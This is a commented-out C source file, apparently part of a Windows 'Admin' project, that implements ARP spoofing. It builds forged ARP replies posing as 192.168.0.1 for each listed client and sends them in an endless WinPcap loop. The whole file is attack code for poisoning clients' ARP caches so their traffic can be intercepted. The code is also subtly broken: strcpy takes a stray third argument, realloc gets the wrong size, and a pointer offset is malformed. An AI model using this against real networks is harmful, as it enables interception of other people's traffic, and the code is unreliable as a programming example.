//#include "Admin.h"
//#include "ARP_Spoofing.h"
//
//extern ARP_List list;
//extern int ARP_FLAG;
//
//int ARP_List_Init(ARP_List *list) {
//	char buf[128];
//	char buf1[128];
//	char *tok;
//	int i, j;
//
//	if (list == NULL) {
//		return FALSE;
//	}
//	list->size = 5;
//	list->howmany = 0;
//	list->list = (arp_t *)calloc(list->size, sizeof(arp_t));
//	return TRUE;
//}
//
//int ARP_List_Add(ARP_List *list, State *client) {
//	char buf[128];
//	char *tok;
//
//	if (list == NULL || client == NULL) {
//		return FALSE;
//	}
//
//	if (list->size - list->howmany < 5) {
//		list->size += 7;
//		list->list = (arp_t *)realloc(list->list, sizeof(arp_t));
//	}
//
//	list->list[list->howmany].Socket = client->Socket;
//
//	memset(buf, NULL, sizeof(buf));
//	strcpy(buf, client->MAC_ADDR, 30);
//
//	tok = strtok(buf, "-");
//	list->list[list->howmany].ethh.Dest_H_Addr[0] = atoi(tok);
//	tok = strtok(NULL, "-");
//	list->list[list->howmany].ethh.Dest_H_Addr[1] = atoi(tok);
//	tok = strtok(NULL, "-");
//	list->list[list->howmany].ethh.Dest_H_Addr[2] = atoi(tok);
//	tok = strtok(NULL, "-");
//	list->list[list->howmany].ethh.Dest_H_Addr[3] = atoi(tok);
//	tok = strtok(NULL, "-");
//	list->list[list->howmany].ethh.Dest_H_Addr[4] = atoi(tok);
//	tok = strtok(NULL, "-");
//	list->list[list->howmany].ethh.Dest_H_Addr[5] = atoi(tok);
//
//	//memcpy(list->list[list->howmany].ethh.Dest_H_Addr, buf1, 12);
//
//	list->list[list->howmany].ethh.TYPE = htons(0x0806);
//	list->list[list->howmany].arph.Hardware_Type = htons(0x0001);
//	list->list[list->howmany].arph.Protocol_Type = htons(0x0800);
//	list->list[list->howmany].arph.Hardware_Addr_Length = 0x06;
//	list->list[list->howmany].arph.Protocol_Length = 0x04;
//	list->list[list->howmany].arph.Operation = htons(0x0002);
//
//	list->list[list->howmany].arph.Sender_IP_Addr[0] = 192;
//	list->list[list->howmany].arph.Sender_IP_Addr[1] = 168;
//	list->list[list->howmany].arph.Sender_IP_Addr[2] = 0;
//	list->list[list->howmany].arph.Sender_IP_Addr[3] = 1;
//
//	memcpy(list->list[list->howmany].arph.Target_H_Addr, list->list[list->howmany].ethh.Dest_H_Addr, 6);
//
//	memcpy(buf, client->IP_ADDR, 30);
//
//	tok = strtok(buf, ".");
//	list->list[list->howmany].arph.Target_IP_Addr[0] = atoi(tok);
//	tok = strtok(NULL, ".");
//	list->list[list->howmany].arph.Target_IP_Addr[1] = atoi(tok);
//	tok = strtok(NULL, ".");
//	list->list[list->howmany].arph.Target_IP_Addr[2] = atoi(tok);
//	tok = strtok(NULL, ".");
//	list->list[list->howmany].arph.Target_IP_Addr[3] = atoi(tok);
//
//	list->howmany++;
//
//	return TRUE;
//}
//
//int ARP_List_Delete(ARP_List *list, State *client) {
//	int i;
//
//	if (list == NULL || client == NULL) {
//		return FALSE;
//	}
//
//	for (i = 0; i < list->howmany; i++) {
//		if (list->list[i].Socket == client->Socket) {
//			//list->list[i] = NULL;
//			memcpy(&list->list[i], &list->list[i + 1], sizeof(arp_t)*(list->howmany - i));
//			list->howmany--;
//			return TRUE;
//		}
//	}
//	list->howmany--;
//	return TRUE;
//}
//
//
//
//UINT WINAPI ARP(void *arg) {
//	int i;
//
//	pcap_if_t *alldevs;
//	pcap_t *adhandle;
//	arp_t packet;
//
//	PIP_ADAPTER_INFO Info;
//	DWORD size = sizeof(PIP_ADAPTER_INFO);
//	ULONG result;
//
//	ARP_List_Init(&list);
//
//	pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, NULL);
//	adhandle = pcap_open(alldevs->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, NULL, NULL, NULL);
//
//	pcap_freealldevs(alldevs);
//
//	memset(&Info, 0x00, size);
//	result = GetAdaptersInfo(Info, &size);
//
//	if (result == ERROR_BUFFER_OVERFLOW)
//	{
//		Info = (PIP_ADAPTER_INFO)malloc(size);
//		GetAdaptersInfo(Info, &size);
//	}
//
//	while (TRUE) {
//		if (list.howmany == 0) {
//			ARP_FLAG = TRUE;
//			break;
//		}
//		for (i = 0; i < list.howmany; i++) {
//			pcap_sendpacket(adhandle, &list.list[i] + 4, sizeof(arp_t) - 4);
//		}
//		Sleep(1000 / (list.howmany + 1));
//	}
//}